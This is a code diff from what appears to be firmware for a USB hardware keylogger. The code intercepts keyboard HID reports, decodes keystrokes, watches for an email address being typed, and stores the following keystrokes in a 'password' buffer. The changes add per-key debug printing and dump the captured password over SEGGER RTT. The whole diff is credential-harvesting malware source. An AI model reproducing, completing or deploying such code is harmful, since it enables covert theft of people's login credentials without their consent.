@@ -33,8 +33,8 @@ static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
     uint8_t *report = (uint8_t *)hidp->config->report_buffer;
 
     //get every input in a tab
-    rtt_printf("Key code: %02X\n", report[2]);
     uint8_t input = hid2azerty(report);
+    rtt_printf("Key code: %02X = %c   \tidx = %02x", report[2], input, input_index);
     if(input) {
         input_tab[input_index] = input;
         usbh_email_detector(input);
@@ -120,6 +120,7 @@ static void store_lasts_inputs(int size)
     }
     else
         memcpy(password + password_idx, input_tab + input_index - size, size);
+    rtt_printf("%02X %02X %02X\n", input_tab[input_index - 2], input_tab[input_index - 1], input_tab[input_index]);
     password_idx += size;
 }
 
@@ -147,8 +148,10 @@ void usbh_email_detector(uint8_t input)
             // disable input timer
             input_timer = -1;
             // print password buffer
-            password[password_idx] = '\0';
-            rtt_printf("password buffer: %s\n", password);
+            rtt_printf("password_idx: %d", password_idx);
+            rtt_printf("PASSWORD :");
+            SEGGER_RTT_Write(0, password, password_idx);
+            rtt_printf("");
             break;
     }
     // if input timer is not disabled, decrease its value
